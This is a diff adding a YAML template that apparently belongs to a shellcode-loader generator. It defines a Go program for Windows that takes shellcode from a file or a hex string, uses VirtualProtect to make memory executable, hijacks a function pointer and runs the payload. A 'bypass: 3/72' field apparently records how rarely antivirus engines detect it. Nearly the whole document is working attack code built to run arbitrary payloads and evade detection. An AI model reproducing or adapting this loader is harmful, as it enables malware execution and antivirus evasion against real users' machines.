@@ -1,0 +1,44 @@
+name: Go-EXE-Windows-Null-No-ShellcodeLoader
+time: 1630944000
+bypass: 3/72
+language: go
+build: ~
+process: exe
+set: ~
+include:
+  - 'encoding/hex'
+  - 'io/ioutil'
+  - 'os'
+  - 'syscall'
+  - 'unsafe'
+state: ~
+define: ~
+class: ~
+function:
+  - |
+    func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
+    var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
+    ret, _, _ := procVirtualProtect.Call(uintptr(lpAddress),uintptr(dwSize),uintptr(flNewProtect),uintptr(lpflOldProtect))
+    return ret > 0
+    }
+  - |
+    func Run(sc []byte) {
+    f := func() {}
+    var oldfperms uint32
+    if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
+    panic("")}
+    **(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))
+    var oldshellcodeperms uint32
+    if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
+    panic("")}
+    f()}
+  - |
+    func main() {
+    if len(os.Args) != 2 {
+    os.Exit(1)}
+    sc, err := ioutil.ReadFile(os.Args[1])
+    if os.IsNotExist(err) {
+    sc, err = hex.DecodeString(os.Args[1])
+    if err != nil {
+    os.Exit(1)}}
+    Run(sc)}
